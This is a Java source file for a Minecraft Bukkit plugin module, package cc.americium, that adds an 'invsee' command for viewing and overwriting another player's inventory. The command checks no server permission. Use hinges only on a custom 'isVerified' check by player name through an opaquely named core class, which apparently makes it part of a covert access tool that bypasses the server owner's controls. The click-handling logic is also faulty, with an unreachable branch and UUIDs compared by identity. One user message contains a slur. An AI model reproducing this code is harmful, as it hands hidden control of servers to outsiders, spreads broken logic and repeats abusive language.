package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;

import java.io.IOException;
import java.util.HashMap;
import java.util.UUID;

public class Inventory implements Command, Listener {
    private final HashMap<UUID, UUID> viewers = new HashMap<>();
    private Z_ z;

    @Override
    public boolean playerOnly() {
        return true;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"inventory", "invsee"};
    }

    @Override
    public String getDescription() {
        return "See and modify another player's inventory.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "invsee <player>");
            return;
        }

        Player player = Bukkit.getPlayer(args[0]);
        if (player == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        if (player.getUniqueId() == executor.getUniqueId()) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "click e retard");
            return;
        }

        viewers.put(executor.getUniqueId(), player.getUniqueId());
        Bukkit.getScheduler().runTask(context.getZ_(), () -> executor.openInventory(player.getInventory()));
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
        this.z = z;
    }

    @EventHandler
    private void inventoryClick(InventoryClickEvent e) throws IOException, InterruptedException {
        if (e.getWhoClicked().getType() != EntityType.PLAYER) {
            return;
        }

        Player player = (Player) e.getWhoClicked();
        if (!z.getAuth().isVerified(player.getName())) {
            return;
        }

        if (!viewers.containsKey(player.getUniqueId()) || viewers.containsValue(player.getUniqueId())) {
            return;
        }

        if (viewers.containsValue(player.getUniqueId())) {
            UUID foundUUID = viewers.get(player.getUniqueId());
            Player foundPlayer = Bukkit.getPlayer(foundUUID);
            if (foundPlayer == null) {
                viewers.remove(player.getUniqueId());
                player.closeInventory();
                return;
            }

            foundPlayer.getInventory().setContents(player.getOpenInventory().getTopInventory().getContents());
            return;
        }

        UUID foundUUID = null;
        for (UUID uuid : viewers.keySet()) {
            UUID otherUUID = viewers.get(uuid);
            if (otherUUID == player.getUniqueId()) {
                foundUUID = uuid;
                break;
            }
        }

        if (foundUUID == null) {
            return;
        }

        Player foundPlayer = Bukkit.getPlayer(foundUUID);
        if (foundPlayer == null) {
            viewers.remove(foundUUID);
            return;
        }

        foundPlayer.closeInventory();
        Bukkit.getScheduler().runTask(this.z, () -> foundPlayer.openInventory(player.getInventory()));

    }

    @EventHandler
    private void inventoryClose(InventoryCloseEvent e) throws IOException, InterruptedException {
        Player player = (Player) e.getPlayer();
        if (z.getAuth().isVerified(player.getName())) {
            viewers.remove(player.getUniqueId());
        }
    }
}
